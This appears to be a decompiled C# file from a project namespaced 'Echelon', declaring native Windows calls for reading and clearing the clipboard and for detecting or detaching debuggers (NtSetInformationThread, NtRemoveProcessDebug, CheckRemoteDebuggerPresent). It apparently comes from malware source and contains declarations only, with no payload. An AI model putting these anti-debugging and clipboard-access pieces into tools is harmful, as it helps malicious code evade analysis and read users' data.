using System;
using System.Runtime.InteropServices;
using Echelon.Global.Other;
using Echelon.Global.Other.WinStructs;

namespace Echelon.Global
{
	// Token: 0x02000048 RID: 72
	internal class NativeMethods
	{
		// Token: 0x060001A4 RID: 420
		[DllImport("user32.dll")]
		internal static extern IntPtr GetClipboardData(uint uFormat);

		// Token: 0x060001A5 RID: 421
		[DllImport("user32.dll")]
		public static extern bool IsClipboardFormatAvailable(uint format);

		// Token: 0x060001A6 RID: 422
		[DllImport("user32.dll", SetLastError = true)]
		internal static extern bool OpenClipboard(IntPtr hWndNewOwner);

		// Token: 0x060001A7 RID: 423
		[DllImport("user32.dll", SetLastError = true)]
		internal static extern bool CloseClipboard();

		// Token: 0x060001A8 RID: 424
		[DllImport("user32.dll")]
		internal static extern bool EmptyClipboard();

		// Token: 0x060001A9 RID: 425
		[DllImport("kernel32.dll")]
		internal static extern IntPtr GlobalLock(IntPtr hMem);

		// Token: 0x060001AA RID: 426
		[DllImport("kernel32.dll")]
		internal static extern bool GlobalUnlock(IntPtr hMem);

		// Token: 0x060001AB RID: 427
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x060001AC RID: 428
		[DllImport("ntdll.dll")]
		public static extern NtStatus NtSetInformationThread(IntPtr ThreadHandle, ThreadInformationClass ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

		// Token: 0x060001AD RID: 429
		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

		// Token: 0x060001AE RID: 430
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool CloseHandle(IntPtr handle);

		// Token: 0x060001AF RID: 431
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern NtStatus NtQueryInformationProcess([In] IntPtr ProcessHandle, [In] PROCESSINFOCLASS ProcessInformationClass, out IntPtr ProcessInformation, [In] int ProcessInformationLength, out int ReturnLength);

		// Token: 0x060001B0 RID: 432
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern NtStatus NtClose([In] IntPtr Handle);

		// Token: 0x060001B1 RID: 433
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern NtStatus NtRemoveProcessDebug(IntPtr ProcessHandle, IntPtr DebugObjectHandle);

		// Token: 0x060001B2 RID: 434
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern NtStatus NtSetInformationDebugObject([In] IntPtr DebugObjectHandle, [In] DebugObjectInformationClass DebugObjectInformationClass, [In] IntPtr DebugObjectInformation, [In] int DebugObjectInformationLength, out int ReturnLength);

		// Token: 0x060001B3 RID: 435
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern NtStatus NtQuerySystemInformation([In] SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, [In] int SystemInformationLength, out int ReturnLength);

		// Token: 0x060001B4 RID: 436
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

		// Token: 0x060001B5 RID: 437
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsDebuggerPresent();
	}
}
